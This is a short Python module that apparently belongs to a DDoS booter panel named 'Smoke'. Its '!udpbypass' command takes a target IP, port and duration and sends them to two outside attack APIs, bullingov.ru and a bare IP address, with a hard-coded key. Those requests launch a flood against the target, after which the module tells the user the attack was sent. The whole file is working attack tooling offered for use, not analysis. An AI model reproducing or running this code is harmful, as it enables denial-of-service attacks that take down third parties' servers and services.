import requests
from colorama import Fore
import time

last_udpbypass_time = 0

def udpbypass(args, validate_time, send, client, ansi_clear, broadcast, data):
    global last_udpbypass_time
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        time_str = args[3]
        try:
            time_int = int(time_str)
            if time_int > 60:
                send(client, "Your max time is 60 seconds")
                return
            if time.time() - last_udpbypass_time < 60:
                send(client, "Your max concurrent is 1")
                return

            res1 = requests.get(f'https://bullingov.ru/api.php?key=sqpenis&host={ip}&port={port}&time={time_str}&method=HOME')
            res2 = requests.get(f'http://162.19.145.38/api.php?key=sqpenis&host={ip}&port={port}&time={time_str}&method=HOME')
            if validate_time(str(time_int)):
                last_udpbypass_time = time.time()
                send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTRED_EX}Smoke {Fore.LIGHTWHITE_EX}servers!")
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
        except Exception as e:
            send(client, f'Error: {str(e)}')
    else:
        send(client, f'Usage: {Fore.LIGHTWHITE_EX}!udpbypass [IP] [PORT] [TIME]')








